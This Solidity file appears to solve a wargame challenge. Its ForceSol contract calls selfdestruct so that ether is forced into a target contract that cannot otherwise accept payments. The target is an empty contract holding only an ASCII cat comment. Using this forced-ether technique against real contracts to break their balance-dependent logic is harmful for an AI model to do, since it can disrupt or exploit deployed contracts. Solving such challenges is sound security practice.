// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

contract ForceSol{
    Force public targetContract;
    constructor (address payable _targetContract){
        targetContract = Force(_targetContract);
    }

    function attack() payable public {
        address payable adr = payable(address(targetContract));
        selfdestruct(adr);
    }
}

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}